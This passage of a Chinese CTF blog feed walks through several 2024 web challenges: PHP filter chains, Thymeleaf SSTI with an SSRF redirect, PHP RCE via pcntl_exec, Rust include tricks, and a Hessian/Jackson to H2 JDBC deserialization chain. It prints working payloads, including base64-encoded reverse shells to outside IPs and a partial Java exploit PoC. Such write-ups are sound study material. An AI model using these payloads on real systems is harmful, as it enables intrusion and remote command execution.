class="code-wrapper"><pre><code class="hljs jboss-cli">python3 filters_chain_oracle_exploit.py <span class="hljs-params">--target</span> http:<span class="hljs-string">//localhost</span><span class="hljs-function">:1238</span>/ <span class="hljs-params">--file</span> <span class="hljs-string">/var/www/html/flag.php</span> <span class="hljs-params">--parameter</span> f <span class="hljs-params">--time_based_attack</span> True <span class="hljs-params">--match</span> <span class="hljs-string">&quot;Allowed memory size&quot;</span></code></pre></div><p>他这里完成以后<code>/var/www/html/flag.php</code>好像都会变成<code>/flag</code>，好奇怪，不过不要紧</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404182152972.png" alt="image-20240404182152972"></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ezphpPhp8&#x27;</span>])) &#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No&quot;</span>);&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);    &#125;&#125;;<span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ezphpPhp8&#x27;</span>];<span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>();<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">getflag</span>();</code></pre></div><p>这里有提示php8，很明显是匿名类</p><p>像lolita大佬就很熟悉了，直接<code>var_dump(get_declared_classes());</code></p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404185917837.png" alt="image-20240404185917837"></p><p><a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">https://hi-arkin.com/archives/php-anonymous-stdClass.html</a></p><p>文章提到匿名类函数名称格式：<code>&#39;class@anonymous&#39;+chr(0)+php文件路径:行数$列数</code></p><p>但这个列数就很奇怪，每访问一次就会变化</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/recording.gif"></p><p>所以最好一次通关</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404185525594.png" alt="image-20240404185525594"></p><h3 id="小疑惑"><a href="#小疑惑" class="headerlink" title="小疑惑"></a>小疑惑</h3><p>主要是说一下第一部分，过一遍文章肯定是知道用工具</p><p>但仔细看了一下就会知道是测信道盲注</p><p>然后我就尝试了下之前的一个题目是用file的测信道盲注的脚本，但感觉应该是我的问题，老是报错</p><p>感觉理论上是可以的，都是利用filterchain</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404193434470.png" alt="image-20240404193434470"></p><h2 id="Simp1escape"><a href="#Simp1escape" class="headerlink" title="Simp1escape"></a>Simp1escape</h2><p>审一遍路由</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404194409949.png" alt="image-20240404194409949"></p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404194448862.png" alt="image-20240404194448862"></p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404194904333.png" alt="image-20240404194904333"></p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404194502013.png" alt="image-20240404194502013"></p><h3 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h3><p>由于没报名，只看附件感觉挺简单，所以就会产生误区</p><p>我看了附件后的思路就是控制响应数据，然后指定文件渲染即可</p><p>但其实题目没有权限写入文件</p><p>然后就止步不前</p><h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>由于受到<code>/</code>路由的影响，我下意识的以为<code>/getsites</code>的hostname只能传一个文件名</p><p>其实hostname直接传入模板注入payload即可</p><p>然后thymeleaf3.0.15版本的payload好像挺难找</p><p>直接给出别人的WP的两种方法</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">[[$</span><span class="hljs-template-variable">&#123;T(java.lang.Boolean).forName(&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;).newInstance().readValue(&quot;&#123;&#125;</span><span class="language-xml">&quot;,T(org.springframework.expression.spel.standard.SpelExpressionParser)).parseExpression(&quot;T(Runtime).getRuntime().exec(&#x27;bash -c </span><span class="hljs-template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMTk1LjE0OS41MC83NTc1IDA+JjE=&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml">&#x27;)&quot;).getValue()&#125;]]</span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">|</span></span></span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">|</span></span></span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&#x27;)&#125;&quot;</span> <span class="hljs-attr">th:title</span>=<span class="hljs-string">&#x27;pepito&#x27;</span>&gt;</span></span></code></pre></div><p>然后就是如何进入这里，他这限定了要127.0.0.1</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404194409949.png" alt="image-20240404194409949"></p><p>但是在Utils中又检查了回环地址，得绕过</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404201533687.png" alt="image-20240404201533687"></p><p>如何绕过呢，看这里</p><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/image-20240404201615521.png" alt="image-20240404201615521"></p><p>我当时只想着控制响应，就忽略了很多东西</p><p>这里其实相当于一个url请求</p><p>可以利用它进行302跳转</p><p>准备一个php</p><div class="code-wrapper"><pre><code class="hljs perl">&lt;?phpheader(<span class="hljs-string">&quot;Location:http://127.0.0.1:8080/getsites?hostname=%5B%5B%24%7BT(java.lang.Boolean).forName(%22com.fasterxml.jackson.databind.ObjectMapper%22).newInstance().readValue(%22%7B%7D%22%2CT(org.springframework.expression.spel.standard.SpelExpressionParser)).parseExpression(%22T(Runtime).getRuntime().exec(&#x27;bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTguMTk1LjE0OS41MC83NTc1IDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&#x27;)%22).getValue()%7D%5D%5D&quot;</span>);<span class="hljs-keyword">exit</span>;</code></pre></div><p>然后访问这个php文件</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p:<span class="hljs-number">8080</span><span class="hljs-regexp">/curl?url=http:/</span><span class="hljs-regexp">/vps/</span><span class="hljs-number">30</span>x.php</code></pre></div><p>然后即可反弹shell</p><h2 id="Auth"><a href="#Auth" class="headerlink" title="Auth"></a>Auth</h2><p>直接copy别人的WP，不想看了，其实就两个细节，一个是找到pcntl_exec，另一个就是反弹shell后找到提权的密码</p><p>访问需要登陆，<a href="http://www.zip里面有密码,我们直接登陆/">www.zip里面有密码，我们直接登陆</a></p><div class="code-wrapper"><pre><code class="hljs nsis">[<span class="hljs-number">2022</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span> <span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>]  Authentication successful - <span class="hljs-literal">User</span>: <span class="hljs-literal">admin</span> Pass: <span class="hljs-number">2</span>e525e29e465f45d8d7c56319fe73036</code></pre></div><p>无参RCE，然后我们可以读到&#x2F;etc&#x2F;passwd，但是读不了flag，所以我们反弹shell</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?cmd=show_source(session_id(session_start()));</span>  <span class="hljs-string">HTTP/1.0</span><span class="hljs-string">Host:</span> xxx.com<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">WWW-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm=&quot;Restricted Area<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,ja;q=0.8,vi;q=0.7<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=/etc/passwd<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close</code></pre></div><p>我们用readfile读取disable_func发现pcntl_exec没有被ban，所以我们直接反弹shell，flag就在根目录，</p><p>当前目录下有个config.inc.php，里面有个密码，我们su admin之后读取的文件</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?cmd=pcntl_exec(&#x27;/usr/bin/python&#x27;,[&#x27;-c&#x27;,base64_decode(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyMy4xMjMuMTIzLjEyMyIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIik=&#x27;)]);</span> <span class="hljs-meta">HTTP/1.0</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx.com<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">WWW-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm=&quot;Restricted Area<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,ja;q=0.8,vi;q=0.7<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close</code></pre></div><p><img src="/../images/%E7%BA%A2%E6%98%8E%E8%B0%B72024-web%E5%A4%8D%E7%8E%B0/640.webp" alt="图片"></p><h2 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h2><p>rust就不复现了，这看了下次还不会，没什么用</p><p>给出别人的WP</p><h3 id="内联C"><a href="#内联C" class="headerlink" title="内联C"></a>内联C</h3><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rust_code</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>146<span class="language-rust"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;</span><span class="language-rust">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">system</span>(s: *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span>;</span><span class="language-rust">&#125;</span><span class="language-rust"></span><span class="language-rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;</span><span class="language-rust">    <span class="hljs-keyword">unsafe</span> &#123;</span><span class="language-rust">        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">b&quot;cat /flag\0&quot;</span>.<span class="hljs-title function_ invoke__">as_ptr</span>() <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>);</span><span class="language-rust">    &#125;</span><span class="language-rust">&#125;</span></code></pre></div><h3 id="rust-code路由里传data都会被编译，利用编译报错包含读-flag"><a href="#rust-code路由里传data都会被编译，利用编译报错包含读-flag" class="headerlink" title="&#x2F;rust_code路由里传data都会被编译，利用编译报错包含读&#x2F;flag"></a>&#x2F;rust_code路由里传data都会被编译，利用编译报错包含读&#x2F;flag</h3><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/rust_code</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>eci-2ze7qox8oygjcap3uy31.cloudeci1.ichunqiu.com:8000<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>17<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="language-cmake"><span class="hljs-keyword">include</span>!(<span class="hljs-string">&quot;/flag&quot;</span>)</span></code></pre></div><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>题目还是挺难的，但是除了java好像都被杀穿了，唉</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>chain17</title>
    <link href="/2024/03/27/chain17/"/>
    <url>/2024/03/27/chain17/</url>
    
    <content type="html"><![CDATA[<h1 id="AliyunCTF2024-–chain17"><a href="#AliyunCTF2024-–chain17" class="headerlink" title="AliyunCTF2024 –chain17"></a>AliyunCTF2024 –chain17</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>W&amp;M和V&amp;N的各位爷太强了，web都AK了</p><p>随着偶像Boogipop和各位web✌解出chain17，web也随之被AK</p><p>那我们来看看这个chain17</p><p>主要是其他的写不来一点</p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>题目有agent.jar和server.jar，说明我们要先打下agent端，再打server端</p><h3 id="agent"><a href="#agent" class="headerlink" title="agent"></a>agent</h3><p><img src="/../images/chain17/image-20240327233716497.png" alt="image-20240327233716497"></p><p>这说明这个包下肯定有类要进行调用</p><p><img src="/../images/chain17/image-20240327224147573.png" alt="image-20240327224147573"></p><p><img src="/../images/chain17/image-20240327233651432.png" alt="image-20240327233651432"></p><p><img src="/../images/chain17/image-20240327233745619.png" alt="image-20240327233745619"></p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p><img src="/../images/chain17/image-20240327233844764.png" alt="image-20240327233844764"></p><h2 id="agent-1"><a href="#agent-1" class="headerlink" title="agent"></a>agent</h2><p><img src="/../images/chain17/image-20240327223807049.png" alt="image-20240327223807049"></p><p>路由只有一个hessian反序列化的入口</p><p>并且这个hessian依赖中好像并没有toString的那个CVE</p><p>刚开始大佬们因为对这些依赖都不太熟悉，所以有点走偏，提示出来之后就顺畅很多</p><p><img src="/../images/chain17/image-20240327231556761.png" alt="image-20240327231556761"></p><p>其实当时看协作文档我也没看出什么所以然，以至于给出这个提示我也看不懂</p><p>赛后也是结合各个wp进行分析，没人教实在太痛苦了，花了好几天才理解（呜呜呜</p><p>首先因为入口是Hessian2Input.readObject，所以当我们序列化一个Map的子类</p><p>反序列化必定经过<code>MapDeserializer</code>的<code>map.put</code></p><p><img src="/../images/chain17/image-20240327235649393.png" alt="image-20240327235649393"></p><p>我们只需要找到一个Map的子类进行利用</p><p><img src="/../images/chain17/image-20240327235050085.png" alt="image-20240327235050085"></p><p>在进行<code>map.put</code>之前，会多次经过下面这个方法中获取黑名单，并依次检查new的类、他们的所有父类以及他们的接口是否在黑名单中</p><p><img src="/../images/chain17/image-20240327233315089.png" alt="image-20240327233315089"></p><p>然后<code>JSONObject.put</code>跟进到</p><p><img src="/../images/chain17/image-20240328001435089.png" alt="image-20240328001435089"></p><p><img src="/../images/chain17/image-20240328001457614.png" alt="image-20240328001457614"></p><p>我试了下直接放入POJONode，但他不是jdk内部类，就进不到这里</p><p>然后就找到<code>AtomicReference</code>类</p><p><img src="/../images/chain17/image-20240328002241223.png" alt="image-20240328002241223"></p><p>接着到String类下的valueOf</p><p><img src="/../images/chain17/image-20240328002342143.png" alt="image-20240328002342143"></p><p>控制obj为POJONode即可</p><p><img src="/../images/chain17/image-20240328003923405.png" alt="image-20240328003923405"></p><p>也就是控制<code>AtomicReference</code>的<code>value</code>属性为<code>PojoNode</code></p><p>接下来肯定就是调用Bean的<code>getObject</code></p><p><img src="/../images/chain17/image-20240328004154396.png" alt="image-20240328004154396"></p><p>然后大佬的思路就是给出了h2的依赖肯定有用，那就去找getter打jdbc</p><p>这里我猜测一下大佬的思路，应该是去找<code>DriverManager.getConnection</code></p><p><img src="/../images/chain17/image-20240328010952144.png" alt="image-20240328010952144"></p><p>发现在这个函数有使用</p><p><img src="/../images/chain17/image-20240328011032467.png" alt="image-20240328011032467"></p><p>发现能跟进</p><p><img src="/../images/chain17/image-20240328011108004.png" alt="image-20240328011108004"></p><p>发现有两处</p><p><img src="/../images/chain17/image-20240328011126656.png" alt="image-20240328011126656"></p><p>其实这两处都差不多，调用谁的关键在于initialSize，设置initialSize大于等于1就走第一处，不设置只能走第二处</p><h3 id="这里先介绍第一处"><a href="#这里先介绍第一处" class="headerlink" title="这里先介绍第一处"></a>这里先介绍第一处</h3><p>设置<code>initialSize</code>大于等于1</p><p><img src="/../images/chain17/image-20240328015415706.png" alt="image-20240328015415706"></p><p><img src="/../images/chain17/image-20240328015721833.png" alt="image-20240328015721833"></p><p>跟过去</p><p><img src="/../images/chain17/image-20240328015841266.png" alt="image-20240328015841266"></p><p>不断往上跟</p><p>我们可以跟到<code>DSFactory</code>的<code>getDataSource()</code></p><p>但他是抽象类，我们实例化他的实现类即可，即<code>PooledDSFactory</code></p><h3 id="感觉很神奇的东西"><a href="#感觉很神奇的东西" class="headerlink" title="感觉很神奇的东西"></a>感觉很神奇的东西</h3><p>各个WP的调用栈都是这样</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Bean</span>.</span></span>getObject -&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PooledDSFactory</span>.</span></span>getDataSource</code></pre></div><p>实现的话就把准备好的<code>PooledDSFactory</code>对象序列化后放入Bean的data去反序列化</p><p><img src="/../images/chain17/image-20240328010307571.png" alt="image-20240328010307571"></p><p>我很奇怪这样的写法，于是我跟着下断点看看，发现一个神奇的东西</p><p><img src="/../images/chain17/image-20240328022847362.png" alt="image-20240328022847362"></p><p>这里是pojonode执行getter的地方，<strong>这里能获取返回值</strong></p><p>按照WP的写法，我们能获取到我们准备的PooledDSFactory对象</p><p>然后走到下面</p><p><img src="/../images/chain17/image-20240328023756136.png" alt="image-20240328023756136"></p><p>我们发现他会再次进入<code>BeanSerializer</code>的<code>serialize</code>方法   ！！！！！！</p><p>这是pojonode获取所有getter并执行的其中一步</p><p>果不其然，在执行getter的前一步，我们发现他已经获取到了<code>PooledDSFactory</code>所有的getter<img src="/../images/chain17/image-20240328024134950.png" alt="image-20240328024134950"></p><p>先执行getSetting，再在执行getDataSource</p><p>执行getDataSource的调用栈</p><p><img src="/../images/chain17/image-20240328024424590.png" alt="image-20240328024424590"></p><p>成功拼接</p><h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><p>就是不设置initialSize大于等于1</p><p>这里我就直接用<code>PooledDSFactory</code>分析下去</p><p>不设置的话也会经过这里</p><p><img src="/../images/chain17/image-20240328025158205.png" alt="image-20240328025158205"></p><p>但是不会进入newConnection</p><p>然后就返回一个实例化的PooledDataSource</p><p><img src="/../images/chain17/image-20240328025247446.png" alt="image-20240328025247446"></p><p>然后继续返回一个DataSourceWrapper对象</p><p><img src="/../images/chain17/image-20240328025427495.png" alt="image-20240328025427495"></p><p><img src="/../images/chain17/image-20240328025513111.png" alt="image-20240328025513111"></p><p>然后就是我所说的很神奇的东西，会返回执行完getter的值</p><p><img src="/../images/chain17/image-20240328025649263.png" alt="image-20240328025649263"></p><p>那这里就会继续获取DataSourceWrapper的所有getter并执行</p><p><img src="/../images/chain17/image-20240328025805202.png" alt="image-20240328025805202"></p><p>我们要的是getConnection</p><p><img src="/../images/chain17/image-20240328030005111.png" alt="image-20240328030005111"></p><p><img src="/../images/chain17/image-20240328030159997.png" alt="image-20240328030159997"></p><p>这两处都差不多，还是第一处方便一点</p><h3 id="payload实现的赋值细节"><a href="#payload实现的赋值细节" class="headerlink" title="payload实现的赋值细节"></a>payload实现的赋值细节</h3><p><img src="/../images/chain17/image-20240328031156435.png" alt="image-20240328031156435"></p><p><img src="/../images/chain17/image-20240328031222354.png" alt="image-20240328031222354"></p><p>dsMap要赋值，不赋值过不了</p><p><img src="/../images/chain17/image-20240328031313114.png" alt="image-20240328031313114"></p><p>不太理解的就是这个raw</p><h3 id="打h2数据库"><a href="#打h2数据库" class="headerlink" title="打h2数据库"></a>打h2数据库</h3><p>h2数据库在初始化或能控制jdbc的情况下，能够init runscript执行sql文件</p><div class="code-wrapper"><pre><code class="hljs routeros">jdbc:h2:mem:testdb;<span class="hljs-attribute">TRACE_LEVEL_SYSTEM_OUT</span>=3;INIT=RUNSCRIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;http://127.0.0.1:8000/poc.sql&#x27;</span></code></pre></div><p>poc.sql</p><div class="code-wrapper"><pre><code class="hljs gauss"><span class="hljs-keyword">CREATE</span> ALIAS <span class="hljs-built_in">EXEC</span> AS &#x27;<span class="hljs-keyword">String</span> <span class="hljs-built_in">shellexec</span>(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().<span class="hljs-built_in">exec</span>(cmd);<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;su18&quot;</span>;&#125;&#x27;;<span class="hljs-keyword">CALL</span> <span class="hljs-built_in">EXEC</span> (&#x27;calc&#x27;)</code></pre></div><p>改为反弹shell拿下agent端</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><div class="code-wrapper"><pre><code class="hljs reasonml">import cn.hutool.core.map.SafeConcurrentHashMap;import cn.hutool.db.ds.pooled.PooledDSFactory;import cn.hutool.json.JSONObject;import cn.hutool.setting.Setting;import com.alibaba.com.caucho.hessian.io.Hessian2Input;import com.alibaba.com.caucho.hessian.io.Hessian2Output;import com.alibaba.com.caucho.hessian.io.SerializerFactory;import com.fasterxml.jackson.databind.node.POJONode;import com.aliyunctf.agent.other.Bean;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.Base64;import java.util.HashMap;import java.util.concurrent.atomic.AtomicReference;public <span class="hljs-keyword">class</span> WM_agent &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        ClassPool classPool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        CtClass ctClass = classPool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);        CtMethod ctMethod = ctClass.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>)</span>;        ctClass.remove<span class="hljs-constructor">Method(<span class="hljs-params">ctMethod</span>)</span>;        ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>;        String url=<span class="hljs-string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/poc.sql&#x27;&quot;</span>;        PooledDSFactory pooledDSFactory = create<span class="hljs-constructor">WithoutConstructor(PooledDSFactory.<span class="hljs-params">class</span>)</span>;        Setting setting = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Setting()</span>;        setting.set<span class="hljs-constructor">Charset(<span class="hljs-params">null</span>)</span>;        setting.set(<span class="hljs-string">&quot;url&quot;</span>,url);        setting.put(<span class="hljs-string">&quot;initialSize&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">pooledDSFactory</span>,<span class="hljs-string">&quot;setting&quot;</span>,<span class="hljs-params">setting</span>)</span>;        HashMap&lt;Object, Object&gt; dsmap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        dsmap.put(<span class="hljs-string">&quot;&quot;</span>,null);<span class="hljs-comment">//        setFieldValue(pooledDSFactory,&quot;dsMap&quot;,dsmap);</span>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">pooledDSFactory</span>,<span class="hljs-string">&quot;dsMap&quot;</span>,<span class="hljs-params">new</span> SafeConcurrentHashMap&lt;&gt;()</span>);        Bean bean = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Bean()</span>;        ByteArrayOutputStream baos2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos2</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">pooledDSFactory</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        bean.set<span class="hljs-constructor">Data(<span class="hljs-params">baos2</span>.<span class="hljs-params">toByteArray</span>()</span>);        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">bean</span>)</span>;        AtomicReference atomicReference = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AtomicReference(<span class="hljs-string">&quot;poc&quot;</span>)</span>;        JSONObject jsonObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JSONObject()</span>;        <span class="hljs-comment">//innermap</span>        HashMap&lt;Object, Object&gt; innermap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">innermap</span>, <span class="hljs-string">&quot;size&quot;</span>, 1)</span>;        Class&lt;?&gt; nodeC;        <span class="hljs-keyword">try</span> &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;        &#125;        catch ( ClassNotFoundException e ) &#123;            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span 